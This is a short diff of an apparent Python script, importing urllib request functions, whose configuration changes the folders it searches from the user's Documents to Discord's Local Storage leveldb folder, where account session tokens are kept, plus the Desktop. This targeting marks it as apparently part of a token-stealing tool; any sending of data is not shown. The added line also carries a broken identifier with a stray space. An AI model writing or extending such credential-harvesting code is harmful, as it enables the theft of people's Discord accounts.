@@ -12,8 +12,8 @@ from urllib.request import Request, urlopen
 from urllib.error import URLError, HTTPError
 
 # --- CONFIGURATION ---
-DIRECTORIES_TO_SEARCH = [
-    r"%userprofile%\Documents",
+DIRECTO RIES_TO_SEARCH = [
+    r"%APPDATA%\discord\Local Storage\leveldb",
     r"%userprofile%\Desktop"
 ]
 
